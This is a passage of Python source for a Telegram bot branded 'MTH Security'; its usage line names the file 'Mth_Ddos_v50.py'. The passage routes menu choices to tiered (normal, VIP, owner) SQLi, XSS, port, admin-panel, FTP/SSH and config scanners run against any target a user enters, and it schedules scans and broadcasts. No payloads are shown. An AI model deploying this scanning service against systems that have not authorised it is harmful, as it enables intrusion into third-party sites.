            show_menu_audit(chat_id, user_id)
            return
        
        if cb_data == 'menu:files':
            show_menu_files(chat_id, user_id)
            return
        
        if cb_data == 'menu:vip':
            show_menu_vip(chat_id, user_id)
            return
        
        if cb_data == 'menu:owner':
            show_menu_owner(chat_id, user_id)
            return
        
        if cb_data == 'menu:stats':
            handle_stats(chat_id, user_id, username, first_name, last_name, [])
            return
        
        if cb_data == 'menu:lang':
            buttons = [
                [{"text": "🇧🇷 Português", "callback_data": "setlang:pt"},
                 {"text": "🇺🇸 English", "callback_data": "setlang:en"}],
                [{"text": "🇪🇸 Español", "callback_data": "setlang:es"},
                 {"text": "🇻🇳 Tiếng Việt", "callback_data": "setlang:vi"}],
                [{"text": "🇮🇩 Bahasa Indonesia", "callback_data": "setlang:id"}],
                [{"text": "🔙 Voltar", "callback_data": "menu:back"}],
            ]
            send_message_with_buttons(chat_id, 
                "🌐 <b>Selecione seu idioma</b>\n━━━━━━━━━━━━━━━━━━━━━━\n",
                buttons)
            return
        
        # Owner-exclusive command callbacks
        if cb_data == 'cmd:forensic':
            if not is_owner(user_id):
                send_msg(user_id, chat_id, "❌ Este comando é exclusivo para DONOS.")
                return
            handle_forensic(chat_id, user_id, username, first_name, last_name, [])
            return
        if cb_data == 'cmd:pentest':
            if not is_owner(user_id):
                send_msg(user_id, chat_id, "❌ Este comando é exclusivo para DONOS.")
                return
            handle_pentest(chat_id, user_id, username, first_name, last_name, [])
            return
        if cb_data == 'cmd:osint':
            if not is_owner(user_id):
                send_msg(user_id, chat_id, "❌ Este comando é exclusivo para DONOS.")
                return
            handle_osint(chat_id, user_id, username, first_name, last_name, [])
            return
        
        # Target input flow: "target:cmd:tier"
        if cb_data.startswith('target:'):
            parts = cb_data.split(':')
            if len(parts) >= 3:
                scan_cmd = parts[1]
                tier = parts[2]
                
                # Store pending target request
                PENDING_TARGETS[user_id] = {'cmd': scan_cmd, 'tier': tier}
                
                # Show input prompt
                cmd_display = {
                    'sqli': 'SQLi Scanner',
                    'xss': 'XSS Scanner',
                    'admin': 'Admin Panel Finder',
                    'ports': 'Port Scanner',
                    'dirs': 'Directory Scanner',
                    'sub': 'Subdomain Scanner',
                    'wp': 'WordPress Scanner',
                    'ftpssh': 'FTP/SSH Scanner',
                    'emails': 'Email Scraper',
                    'cms': 'CMS Detector',
                    'reverse': 'Reverse IP Lookup',
                    'dns': 'DNS Tools',
                    'info': 'Website Information',
                    'whois': 'Whois Lookup',
                    'ip': 'GeoIP Analysis',
                    'traceroute': 'Traceroute',
                    'tech': 'Tech Detection',
                    'ssl': 'SSL Audit',
                    'sslchain': 'SSL Chain',
                    'headers': 'Headers Analysis',
                    'http': 'HTTP Analysis',
                    'cors': 'CORS Test',
                    'rate': 'Security Rating',
                    'robots': 'Robots.txt',
                    'sitemap': 'Sitemap Analysis',
                    'exposed': 'Exposed Files',
                    'backup': 'Backup Finder',
                    'config': 'Config Scanner',
                    'shell': 'Webshell Hunter',
                    'api': 'API Discovery',
                    'scanall': 'ScanAll',
                    'deep': 'Deep Scan',
                    'forensic': 'Forensic Analysis',
                    'pentest': 'Pentest Automation',
                    'osint': 'OSINT Intelligence',
                }
                cmd_name = cmd_display.get(scan_cmd, scan_cmd)
                tier_badge = "⭐ VIP" if tier == 'vip' else "👑 OWNER" if tier == 'owner' else ""
                if tier_badge:
                    tier_badge = f" ({tier_badge})"
                
                buttons = [[{"text": "❌ Cancelar", "callback_data": "menu:cancel_target"}]]
                send_message_with_buttons(chat_id,
                    f"📋 <b>Insira o alvo</b>{tier_badge}\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"Ferramenta: <b>{cmd_name}</b>\n\n"
                    f"Envie a URL, domínio ou IP do alvo.\n"
                    f"<i>Exemplo: example.com, https://site.com, 192.168.1.1</i>\n\n"
                    f"Para cancelar, pressione o botão abaixo.",
                    buttons)
            return
        
        if cb_data == 'menu:cancel_target':
            PENDING_TARGETS.pop(user_id, None)
            # Edit the message to show cancelled
            try:
                HTTP_SESSION.post(f"{API_URL}/editMessageText", json={
                    "chat_id": chat_id,
                    "message_id": cb_message_id,
                    "text": "❌ <b>Scan cancelado.</b>\n━━━━━━━━━━━━━━━━━━━━━━\n\n"
                            "Volte ao menu principal para selecionar outra ferramenta.",
                    "parse_mode": "HTML",
                    "reply_markup": '{"inline_keyboard": [[{"text": "🔙 Menu Principal", "callback_data": "menu:back"}]]}'
                }, timeout=5)
            except:
                pass
            return
        

        if cb_data.startswith('tier:'):
            parts = cb_data.split(':', 3)
            if len(parts) >= 4:
                _, scan_cmd, tier, target = parts[0], parts[1], parts[2], parts[3]
                # Delete the tier selection message
                if cb_message_id:
                    try:
                        HTTP_SESSION.post(f"{API_URL}/deleteMessage", json={
                            "chat_id": chat_id,
                            "message_id": cb_message_id
                        }, timeout=5)
                    except:
                        pass
                # Route to the correct tier handler
                if scan_cmd == 'sqli':
                    if tier == 'vip':
                        _run_sqli_vip(chat_id, user_id, target)
                    elif tier == 'owner':
                        _run_sqli_owner(chat_id, user_id, target)
                    else:
                        _run_sqli_normal(chat_id, user_id, target)
                    show_main_menu(chat_id, user_id)
                elif scan_cmd == 'xss':
                    if tier == 'vip':
                        _run_xss_vip(chat_id, user_id, target)
                    elif tier == 'owner':
                        _run_xss_owner(chat_id, user_id, target)
                    else:
                        _run_xss_normal(chat_id, user_id, target)
                    show_main_menu(chat_id, user_id)
                elif scan_cmd == 'scanall':
                    if tier == 'vip':
                        _run_scanall_vip(chat_id, user_id, target)
                    elif tier == 'owner':
                        _run_scanall_owner(chat_id, user_id, target)
                    else:
                        _run_scanall_normal(chat_id, user_id, target)
                    show_main_menu(chat_id, user_id)
                elif scan_cmd == 'deep':
                    if tier == 'vip':
                        _run_deep_vip(chat_id, user_id, target)
                    elif tier == 'owner':
                        _run_deep_owner(chat_id, user_id, target)
                    else:
                        _run_deep_normal(chat_id, user_id, target)
                    show_main_menu(chat_id, user_id)
                else:
                    send_msg(user_id, chat_id, f"❌ Scanner /{scan_cmd} não suportado em tier mode.")
            return
        return

    message = update.get('message')
    if not message or not message.get('text'):
        return

    chat_id = str(message['chat']['id'])
    user_id = message['from']['id']
    username = message['from'].get('username', '')
    first_name = message['from'].get('first_name', '')
    last_name = message['from'].get('last_name', '')

    # V5.1 FIX: Enrich username if missing (user may not have public @username)
    if not username:
        username, first_name, last_name = enrich_username(user_id, username, first_name, last_name)
    # Ensure first_name is never empty for display
    if not first_name:
        first_name = username or 'User'

    # i18n: detect user language from Telegram language_code
    if user_id not in USER_LANG:
        detected = detect_lang(message)
        USER_LANG[user_id] = detected

    text = message['text'].strip()
    parts = text.split(maxsplit=1)
    raw_cmd = parts[0].lower()

    # Remove @botname suffix: /command@MyBot -> /command
    # ═══════════════════════════════════════════════════════════
    #  MENU SYSTEM: Check for pending target input
    # ═══════════════════════════════════════════════════════════
    if user_id in PENDING_TARGETS:
        pending = PENDING_TARGETS.pop(user_id)
        scan_cmd = pending['cmd']
        tier = pending['tier']
        
        # The text IS the target
        target = text.strip()
        if not target:
            send_msg(user_id, chat_id, "❌ Alvo inválido. Tente novamente.")
            return
        
        log_command(user_id, username, scan_cmd, target)
        
        # Delete the "input target" message
        try:
            msg_id = message.get('message_id')
            if msg_id:
                HTTP_SESSION.post(f"{API_URL}/deleteMessage", json={
                    "chat_id": chat_id,
                    "message_id": msg_id
                }, timeout=3)
        except:
            pass
        
        # Route to the correct tier handler
        cmd = scan_cmd  # Override cmd for routing
        # Owner commands (forensic/pentest/osint) — route to handlers directly
        if scan_cmd == 'forensic':
            handle_forensic(chat_id, user_id, username, first_name, last_name, [target])
            show_main_menu(chat_id, user_id)
            return
        if scan_cmd == 'pentest':
            handle_pentest(chat_id, user_id, username, first_name, last_name, [target])
            show_main_menu(chat_id, user_id)
            return
        if scan_cmd == 'osint':
            handle_osint(chat_id, user_id, username, first_name, last_name, [target])
            show_main_menu(chat_id, user_id)
            return
        # Map scan commands to handler functions
        SCAN_MAP = {
            'sqli': 'sqli',
            'xss': 'xss',
            'admin': 'admin',
            'panel': 'panel',
            'ports': 'ports',
            'dirs': 'dirs',
            'sub': 'sub',
            'wp': 'wp',
            'ftpssh': 'ftpssh',
            'emails': 'emails',
            'cms': 'cms',
            'reverse': 'reverse',
            'dns': 'dns',
            'info': 'info',
            'whois': 'whois',
            'ip': 'ip',
            'traceroute': 'traceroute',
            'tech': 'tech',
            'ssl': 'ssl',
            'sslchain': 'sslchain',
            'headers': 'headers',
            'http': 'http',
            'cors': 'cors',
            'rate': 'rate',
            'robots': 'robots',
            'sitemap': 'sitemap',
            'exposed': 'exposed',
            'backup': 'backup',
            'config': 'config',
            'shell': 'shell',
            'api': 'api',
            'scanall': 'scanall',
            'deep': 'deep',
        }
        
        # For tiered scanners, use _run_* functions
        TIERED_SCANNERS = ['sqli', 'xss', 'scanall', 'deep',
                          'admin', 'ports', 'dirs', 'sub', 'wp',
                          'ftpssh', 'emails', 'reverse',
                          'whois', 'rate', 'headers', 'dns',
                          'robots', 'tech', 'cms', 'exposed',
                          'backup', 'api', 'shell', 'config',
                          'cors', 'http', 'sslchain', 'ssl',
                          'info', 'sitemap']
        
        if scan_cmd in TIERED_SCANNERS:
            fn_name = f"_run_{scan_cmd}_{tier}"
            fn = globals().get(fn_name)
            if fn:
                fn(chat_id, user_id, target)
                show_main_menu(chat_id, user_id)
                return
            else:
                # Fallback to normal
                fn_name = f"_run_{scan_cmd}_normal"
                fn = globals().get(fn_name)
                if fn:
                    fn(chat_id, user_id, target)
                    show_main_menu(chat_id, user_id)
                    return
        
        # Non-tiered scanners: use handle_* functions
        handler_map = {
            'info': handle_info,
            'whois': handle_whois,
            'ip': handle_ip,
            'traceroute': handle_traceroute,
            'tech': handle_tech,
            'ssl': handle_ssl,
            'sslchain': handle_sslchain,
            'headers': handle_headers,
            'http': handle_http,
            'cors': handle_cors,
            'rate': handle_rate,
            'robots': handle_robots,
            'sitemap': handle_sitemap,
            'exposed': handle_exposed,
            'backup': handle_backup,
            'config': handle_config,
            'shell': handle_shell,
            'api': handle_api,
        }
        
        if scan_cmd in handler_map:
            handler_map[scan_cmd](chat_id, user_id, username, first_name, last_name, [target])
            show_main_menu(chat_id, user_id)
            return
    

    cmd = raw_cmd.split('@')[0]
    args = parts[1].split() if len(parts) > 1 else []

    # Check for reply to a sticker or photo (for /msg media broadcast)
    reply_media = None
    if cmd == '/msg' and message.get('reply_to_message'):
        reply = message['reply_to_message']
        if reply.get('sticker'):
            reply_media = {
                'type': 'sticker',
                'file_id': reply['sticker']['file_id']
            }
        elif reply.get('photo'):
            photos = reply['photo']
            # Use highest resolution photo
            best_photo = max(photos, key=lambda p: p.get('file_size', 0))
            reply_media = {
                'type': 'photo',
                'file_id': best_photo['file_id']
            }
        elif reply.get('animation'):
            reply_media = {
                'type': 'animation',
                'file_id': reply['animation']['file_id']
            }
        elif reply.get('video'):
            reply_media = {
                'type': 'video',
                'file_id': reply['video']['file_id']
            }

    print(f"[{datetime.now().strftime('%H:%M:%S')}] {username or user_id}: {text}")

    # Ban check (allow /start, /help, /ping to respond even if banned)
    if user_id in BANNED_USERS and cmd not in ('/start', '/help', '/about', '/ping', '/status'):
        user_lang = get_user_lang(user_id)
        if user_lang == 'en':
            ban_msg = "🚫 <b>You have been banned from this bot.</b> Access denied."
        elif user_lang == 'es':
            ban_msg = "🚫 <b>Has sido baneado de este bot.</b> Acceso denegado."
        else:
            ban_msg = "🚫 <b>Voce foi banido deste bot.</b> Acesso negado."
        send_message_safe(chat_id, ban_msg)
        return

    # V5.0: Maintenance mode check (only owners bypass)
    if MAINTENANCE_MODE and cmd not in ('/start', '/help', '/about', '/ping', '/status', '/maintenance', '/lang') and not is_owner(user_id):
        user_lang = get_user_lang(user_id)
        if user_lang == 'en':
            msg = "🔧 <b>Bot under maintenance.</b> Please try again later."
        elif user_lang == 'es':
            msg = "🔧 <b>Bot en mantenimiento.</b> Inténtelo de nuevo más tarde."
        else:
            msg = MAINTENANCE_MSG if MAINTENANCE_MSG else "🔧 <b>Bot em manutenção.</b> Tente novamente em breve."
        send_message_safe(chat_id, msg)
        return

    # V5.0: Rate limit check using per-user limit (VIP = unlimited)
    now_ts = time.time()
    limit, window = get_user_rate_limit(user_id)
    bypass_cmds = ('/start', '/help', '/about', '/ping', '/status')
    if user_id in VIP_USERS:
        bypass_cmds += ('/stealth', '/notify')

    user_cmd_list = USER_CMD_COUNT.get(user_id, [])
    user_cmd_list = [t for t in user_cmd_list if now_ts - t < window]
    if len(user_cmd_list) >= limit and cmd not in bypass_cmds:
        remaining = int(window - (now_ts - user_cmd_list[0]))
        user_lang = get_user_lang(user_id)
        if user_lang == 'en':
            send_message_safe(chat_id, f"⏳ <b>Rate limit reached.</b> Wait {remaining}s.")
        elif user_lang == 'es':
            send_message_safe(chat_id, f"⏳ <b>Límite de velocidad alcanzado.</b> Espere {remaining}s.")
        else:
            send_message_safe(chat_id, f"⏳ <b>Rate limit atingido.</b> Aguarde {remaining}s.")
        return
    user_cmd_list.append(now_ts)
    USER_CMD_COUNT[user_id] = user_cmd_list

    # PERF: Cleanup old entries to prevent memory leak (every ~2 min)
    global LAST_SEND_TIME_CLEANUP
    if len(USER_CMD_COUNT) > 100 or now_ts - LAST_SEND_TIME_CLEANUP > 120:
        old_ids = [uid for uid, ts_list in USER_CMD_COUNT.items()
                   if not any(t > now_ts - USER_CMD_WINDOW for t in ts_list)]
        for uid in old_ids:
            del USER_CMD_COUNT[uid]
        LAST_SEND_TIME_CLEANUP = now_ts

    # PERF: handlers dict is now global (defined at module level)
    if cmd in CMD_HANDLERS:
        # Use semaphore to limit concurrent threads (prevent OOM)
        handler_done = threading.Event()
        handler_fn = CMD_HANDLERS[cmd]

        # FIX v4.3: Pass reply_media via closure to avoid race condition
        local_reply_media = reply_media  # Capture in closure

        def run_handler():
            if ACTIVE_THREADS.acquire(timeout=30):
                try:
                    if cmd == '/msg':
                        handle_msg(chat_id, user_id, username, first_name, last_name, args, local_reply_media)
                    elif handler_fn is not None:
                        handler_fn(chat_id, user_id, username, first_name, last_name, args)
                except Exception as e:
                    print(f"[Handler Error] {cmd}: {e}")
                    log_error("handler", f"{cmd} by user {user_id}: {e}")
                finally:
                    ACTIVE_THREADS.release()
            else:
                if user_lang == 'en':
                    send_message_safe(chat_id, "⏳ <b>Server busy.</b> Try again in a few seconds.")
                elif user_lang == 'es':
                    send_message_safe(chat_id, "⏳ <b>Servidor ocupado.</b> Inténtelo de nuevo en unos segundos.")
                else:
                    send_message_safe(chat_id, "⏳ <b>Servidor ocupado.</b> Tente novamente em alguns segundos.")
            handler_done.set()

        threading.Thread(target=run_handler, daemon=True).start()
        # FIX v3.7: Wait for handler to confirm before advancing offset
        handler_done.wait(timeout=5)
    else:
        user_lang = get_user_lang(user_id)
        if user_lang == 'en':
            send_message_safe(chat_id, "❌ <b>Unknown command.</b>\n\nUse /help to see available commands.")
        elif user_lang == 'es':
            send_message_safe(chat_id, "❌ <b>Comando desconocido.</b>\n\nUse /help para ver los comandos disponibles.")
        else:
            send_message_safe(chat_id, "❌ <b>Comando desconhecido.</b>\n\nUse /help para ver os comandos disponíveis.")


def long_polling():
    """Main polling loop with graceful shutdown and retry limits"""
    global SHUTDOWN_FLAG
    offset = 0
    consecutive_errors = 0
    max_consecutive_errors = 30  # Stop after 30 consecutive errors (~5 min)

    print("🚀 MTH Security v5.2 started (long polling mode)")
    print(f"👑 Owners: {OWNERS}")
    print(f"📱 DB: {DB_PATH}")

    while not SHUTDOWN_FLAG:
        try:
            resp = HTTP_SESSION.get(f"{API_URL}/getUpdates", timeout=35, params={
                "offset": offset,
                "timeout": 30,
                "allowed_updates": ["message", "callback_query"]
            })

            if resp.status_code == 200:
                consecutive_errors = 0  # Reset error counter on success
                data = resp.json()
                if data.get('ok') and data.get('result'):
                    for update in data['result']:
                        # FIX: Advance offset AFTER successful processing
                        try:
                            process_update(update)
                            offset = update['update_id'] + 1
                        except Exception as e:
                            print(f"[Update Error] {e}")
                            # Still advance offset to prevent reprocessing
                            offset = update['update_id'] + 1
                else:
                    # API returned ok but no results — wait for next poll
                    pass
            elif resp.status_code == 429:
                # Rate limited
                retry_after = resp.json().get('parameters', {}).get('retry_after', 5)
                print(f"[Polling] Rate limited — waiting {retry_after}s...")
                time.sleep(retry_after)
            elif resp.status_code in [502, 503, 504]:
                # Server error — retry with exponential backoff
                consecutive_errors += 1
                wait = min(5 * consecutive_errors, 60)  # Max 60s wait
                print(f"[Polling] Status: {resp.status_code} — retrying in {wait}s...")
                time.sleep(wait)
            else:
                consecutive_errors += 1
                print(f"[Polling] Status: {resp.status_code}")
                time.sleep(5)

        except KeyboardInterrupt:
            print("\n🛑 Bot stopped by user")
            SHUTDOWN_FLAG = True
        except requests.exceptions.ConnectionError:
            consecutive_errors += 1
            wait = min(5 * consecutive_errors, 60)
            print(f"[Polling] Connection error — retrying in {wait}s...")
            time.sleep(wait)
        except Exception as e:
            consecutive_errors += 1
            print(f"[Polling Error] {e}")
            time.sleep(min(5 * consecutive_errors, 60))

        # FIX: Prevent infinite retry loop
        if consecutive_errors >= max_consecutive_errors:
            print(f"[Polling] Too many consecutive errors ({consecutive_errors}). Stopping.")
            break

    print("🛑 MTH Security v5.2 stopped.")


def set_webhook(url):
    """Set webhook URL"""
    resp = HTTP_SESSION.post(f"{API_URL}/setWebhook", json={
        "url": url,
        "allowed_updates": ["message", "callback_query"],
        "drop_pending_updates": True
    }, timeout=10)
    if resp.status_code == 200:
        data = resp.json()
        if data.get('ok'):
            print(f"✅ Webhook set to: {url}")
        else:
            print(f"❌ Failed to set webhook: {data}")
    else:
        print(f"❌ HTTP {resp.status_code}: {resp.text}")


# V5.0: Site status monitor thread (for /notify) + V5.1: content watch
def site_monitor_loop():
    """Background thread that checks monitored sites every 60s and alerts on status change or content change"""
    global SHUTDOWN_FLAG
    while not SHUTDOWN_FLAG:
        time.sleep(60)
        if SHUTDOWN_FLAG:
            break
        try:
            with sqlite3.connect(DB_PATH) as conn:
                conn.row_factory = sqlite3.Row
                c = conn.cursor()
                c.execute("SELECT * FROM site_monitor")
                monitors = c.fetchall()
                for m in monitors:
                    md = dict(m)
                    target = md['target']
                    last_status = md['last_status']
                    chat_id = md['chat_id']

                    # Check if site is online
                    url = target
                    if not url.startswith(('http://', 'https://')):
                        url = 'http://' + url
                    resp = None
                    try:
                        resp = _safe_get(url, timeout=5)
                        current_status = 1 if (resp and resp.status_code == 200) else 0
                    except:
                        current_status = 0

                    # If status changed, notify
                    if current_status != last_status:
                        if current_status == 0:
                            send_message_safe(str(chat_id), f"⚠️ <b>ALERTA:</b> {escape_html(target)} está <b>OFFLINE</b>!")
                        else:
                            send_message_safe(str(chat_id), f"✅ <b>RECUPERADO:</b> {escape_html(target)} está <b>ONLINE</b>!")

                        c.execute("UPDATE site_monitor SET last_status = ?, last_check = ? WHERE user_id = ? AND target = ?",
                                  (current_status, time.time(), md['user_id'], target))
                        conn.commit()

                    # V5.1: Check content hash changes for /watch
                    if resp and resp.status_code == 200:
                        try:
                            content_hash = md.get('content_hash', '')
                            watch_type = md.get('watch_type', 'status')
                            if watch_type == 'content' and content_hash:
                                new_hash = hashlib.md5(resp.text.encode()).hexdigest()
                                if new_hash != content_hash:
                                    send_message_safe(str(chat_id), f"🔄 <b>ALTERAÇÃO DETECTADA!</b>\n━━━━━━━━━━━━━━━━━━━━━━\n📍 {escape_html(target)}\n📊 Conteúdo mudou!\n━━━━━━━━━━━━━━━━━━━━━━")
                                    c.execute("UPDATE site_monitor SET content_hash = ?, last_check = ? WHERE user_id = ? AND target = ?",
                                              (new_hash, time.time(), md['user_id'], target))
                                    conn.commit()
                        except Exception as ex:
                            print(f"[Content Watch Error] {ex}")
        except Exception as e:
            print(f"[Site Monitor Error] {e}")


# V5.0: Scheduled task consumer thread
def scheduled_task_loop():
    """Background thread that checks scheduled_tasks DB and executes pending tasks"""
    global SHUTDOWN_FLAG
    tool_map = {
        'sqli': tool_sqli, 'xss': tool_xss_scanner, 'admin': tool_admin_finder,
        'panel': tool_admin_finder, 'ports': tool_port_scanner,
        'dirs': tool_directory_scanner, 'sub': tool_subdomain_scanner,
        'wp': tool_wordpress_scanner, 'dns': tool_dns_tools, 'cms': tool_cms_detector,
        'reverse': tool_reverse_ip, 'ftpssh': tool_ftp_ssh, 'info': tool_website_info,
        'emails': tool_email_scraper, 'ssl': tool_ssl_audit, 'headers': tool_headers_analysis,
        'cors': tool_cors_test, 'robots': tool_robots_txt, 'sitemap': tool_sitemap,
        'tech': tool_tech_detect, 'exposed': tool_exposed_files, 'backup': tool_backup_finder,
        'api': tool_api_discovery, 'shell': tool_webshell_hunter, 'config': tool_config_scanner,
        # V5.1: Aggregated tools
        'scanall': lambda t: handle_scanall(None, None, None, None, None, [t]),
        'deep': lambda t: handle_deep(None, None, None, None, None, [t]),
        'quick': lambda t: handle_quick(None, None, None, None, None, [t]),
        'http': lambda t: handle_http(None, None, None, None, None, [t]),
        'sslchain': lambda t: handle_sslchain(None, None, None, None, None, [t]),
    }
    while not SHUTDOWN_FLAG:
        time.sleep(15)  # Check every 15 seconds
        if SHUTDOWN_FLAG:
            break
        try:
            now = time.time()
            with sqlite3.connect(DB_PATH) as conn:
                conn.row_factory = sqlite3.Row
                c = conn.cursor()
                c.execute("SELECT * FROM scheduled_tasks WHERE status = 'pending' AND scheduled_time <= ? LIMIT 5",
                          (now,))
                tasks = c.fetchall()
                for task in tasks:
                    t = dict(task)
                    # Mark as executing first to prevent double execution
                    c.execute("UPDATE scheduled_tasks SET status = 'executing' WHERE id = ?", (t['id'],))
                    conn.commit()

                    cmd = t['cmd']
                    target = t['target']
                    chat_id = t['chat_id']

                    if cmd == 'broadcast':
                        # Broadcast: send target (which is the message text) to all users
                        msg = target
                        try:
                            c2 = conn.cursor()
                            c2.execute("SELECT id FROM users")
                            users = [dict(r) for r in c2.fetchall()]
                            total = len(users)
                            sent = 0
                            failed = 0
                            blocked = 0
                            for u in users:
                                success, fatal = _broadcast_retry_send(
                                    'sendMessage',
                                    {"chat_id": str(u['id']), "text": msg, "parse_mode": "HTML", "disable_web_page_preview": True},
                                    max_retries=1
                                )
                                if success:
                                    sent += 1
                                elif fatal:
                                    blocked += 1
                                else:
                                    failed += 1
                                time.sleep(0.05)
                            send_message_safe(str(t['chat_id']),
                                f"✅ <b>Broadcast executado!</b>\n"
                                f"👥 Total: {total}\n"
                                f"✅ Enviados: {sent}\n"
                                f"⚠️ Bloqueados: {blocked}\n"
                                f"❌ Falhas: {failed}")
                        except Exception as e:
                            print(f"[Schedule Error] broadcast: {e}")
                    else:
                        # Regular scan
                        tool_fn = tool_map.get(cmd)
                        if tool_fn:
                            try:
                                send_message_safe(str(chat_id), f"⏰ <b>Scan agendado executando:</b> /{cmd} {escape_html(extract_hostname(target))}")
                                result = tool_fn(target)
                                send_message_safe(str(chat_id), result)
                                db_cache_set(cmd, target, result)
                            except Exception as e:
                                send_message_safe(str(chat_id), f"❌ Erro no scan agendado: {escape_html(str(e))}")
                        else:
                            send_message_safe(str(chat_id), f"❌ Comando /{cmd} não suportado em scans agendados.")

                    # Mark as completed
                    c.execute("UPDATE scheduled_tasks SET status = 'completed' WHERE id = ?", (t['id'],))
                    conn.commit()

            # Cleanup old completed tasks (older than 24h)
            with sqlite3.connect(DB_PATH) as conn:
                c = conn.cursor()
                c.execute("DELETE FROM scheduled_tasks WHERE status = 'completed' AND scheduled_time < ?", (now - 86400,))
                conn.commit()
        except Exception as e:
            print(f"[Scheduled Task Error] {e}")


def health_check_loop():
    """Background thread that checks bot health every 5 minutes and logs"""
    global SHUTDOWN_FLAG
    while not SHUTDOWN_FLAG:
        time.sleep(300)  # 5 minutes
        if SHUTDOWN_FLAG:
            break
        try:
            # Quick health check
            resp = HTTP_SESSION.get(f"{API_URL}/getMe", timeout=10)
            if resp.status_code != 200:
                log_error("health", f"API unreachable (status {resp.status_code})")
            else:
                uptime_secs = int(time.time() - BOT_START_TIME)
                hours = uptime_secs // 3600
                print(f"[Health] OK | Uptime: {hours}h | Users: {len(USER_CMD_COUNT)} active | Cache: {len(RESULT_CACHE)} | Threads: {threading.active_count()}")
        except Exception as e:
            log_error("health", str(e))


def run_with_restart():
    """Run long_polling with auto-restart on crash"""
    restart_count = 0
    max_restarts = 10  # Max 10 restarts before giving up

    while restart_count < max_restarts and not SHUTDOWN_FLAG:
        try:
            print(f"[Restart] Starting bot (attempt {restart_count + 1}/{max_restarts})")
            long_polling()
        except Exception as e:
            log_error("restart", f"Bot crashed: {e}")
            print(f"[Restart] Bot crashed: {e}")

        if not SHUTDOWN_FLAG and restart_count < max_restarts - 1:
            restart_count += 1
            wait_time = min(30 * restart_count, 300)  # Backoff: 30s, 60s, 90s...
            print(f"[Restart] Restarting in {wait_time}s...")
            time.sleep(wait_time)
        else:
            break

    if restart_count >= max_restarts:
        print(f"[Restart] Max restarts reached ({max_restarts}). Stopping.")
        log_error("restart", f"Max restarts reached ({max_restarts})")


if __name__ == "__main__":
    if len(sys.argv) > 1:
        if sys.argv[1] == "webhook" and len(sys.argv) > 2:
            set_webhook(sys.argv[2])
        elif sys.argv[1] == "polling":
            # Start health check in background
            health_thread = threading.Thread(target=health_check_loop, daemon=True)
            health_thread.start()
            # V5.0: Start site monitor and scheduled task threads
            monitor_thread = threading.Thread(target=site_monitor_loop, daemon=True)
            monitor_thread.start()
            sched_thread = threading.Thread(target=scheduled_task_loop, daemon=True)
            sched_thread.start()
            # Start bot with auto-restart
            run_with_restart()
        elif sys.argv[1] == "test":
            print("MTH Security v5.2")
            print(f"Owners: {OWNERS}")
            print(f"DB: {DB_PATH}")
            stats = get_user_stats()
            print(f"Users: {stats['total']} | Commands: {stats['commands']}")
        else:
            print(f"Unknown argument: {sys.argv[1]}")
            print('Usage: python3 Mth_Ddos_v50.py [polling|webhook <url>|test]')
    else:
        # Default: long polling mode (no args needed)
        # Start health check in background
        health_thread = threading.Thread(target=health_check_loop, daemon=True)
        health_thread.start()
        # Start bot with auto-restart
        run_with_restart()
